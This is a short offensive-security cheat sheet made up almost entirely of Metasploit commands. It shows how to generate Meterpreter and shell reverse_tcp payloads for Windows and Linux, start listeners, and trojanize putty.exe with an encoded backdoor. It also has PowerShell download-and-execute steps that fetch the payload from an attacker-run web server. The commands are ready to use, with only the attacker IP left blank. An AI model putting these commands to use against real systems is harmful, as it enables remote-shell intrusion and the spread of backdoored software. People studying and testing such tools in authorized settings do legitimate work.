Create payload and listener "One Liners"
------------------------------------------------
```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=443 -f exe > ./reverse3.exe
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
# Linux
# This one works, prompt appears to fail, type shell then ls. (crashes some hosts :))
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -b "\x00" -f elf -o new-shell
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set LPORT 4444; run; exit -y"


# Does not seem to work
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=1234 -f elf > ./shell.elf
msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
# PHP
msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
```

Start meterpreter listener for a Windows payload
------------------------------------------------
```bash
# Create Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=443 -f exe > ./reverse3.exe
# Start Listener
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 443
exploit
```

Backdoor a Windows Feedback Executable
------------------------------
```bash
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lport= 4444 lhost=xxx.xxx.xxx.xxx -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```
Generate Payload -> powershell to download -> execute 
--------------------------------------------------------------------
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=7777 -f exe > ./reverse3.exe
# Start Webserver to download
php -S <locahost-ip-address>:80
# Start listener
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 7777
exploit
# Use PowerShell to download payload
powershell Invoke-WebRequest http://xxx.xxx.xxx.xxx:80/reverse3.exe -O 'C:\path\where\you\can\create\files\reverse3.exe'
# Execute payload (try different quotes as needed)
"C:\path\where\you\can\create\files\reverse3.exe"
```

